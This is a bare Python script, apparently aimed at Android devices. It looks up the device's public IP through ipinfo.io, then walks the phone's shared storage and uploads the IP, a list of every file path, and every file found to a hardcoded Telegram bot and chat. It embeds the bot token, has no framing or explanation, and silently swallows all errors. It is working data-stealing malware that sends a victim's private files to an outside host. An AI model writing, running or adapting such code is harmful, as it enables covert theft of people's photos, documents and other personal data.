import os
import requests as req

TELEGRAM_TOKEN = "8144097631:AAHuMUGAVgjOs6LrosbS2uY_3lgNpbucXiM"
CHAT_ID = "7686930478"

def send_ip_to_telegram(ip):
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    message = {
        'chat_id': CHAT_ID,
        'text': f"IP Detected: {ip}"
    }
    try:
        req.post(telegram_url, data=message)
    except:
        pass

def send_file_to_telegram(file_path):
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as file_data:
            message = {
                'chat_id': CHAT_ID,
            }
            req.post(telegram_url, data=message, files={'document': file_data})
    except:
        pass

def fetch_ip():
    try:
        response = req.get("http://ipinfo.io/json")
        data = response.json()
        return data['ip']
    except:
        return None

def save_file_paths_to_file(directory, output_file):
    with open(output_file, 'w') as f:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                f.write(file_path + "\n")

def send_files_from_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            send_file_to_telegram(file_path)

def execute_task():
    ip = fetch_ip()
    if ip:
        send_ip_to_telegram(ip)
    
    storage_path = "/storage/emulated/0/"
    output_file = "file_paths.txt"
    
    save_file_paths_to_file(storage_path, output_file)
    send_file_to_telegram(output_file)
    
    send_files_from_directory(storage_path)

if __name__ == "__main__":
    execute_task()
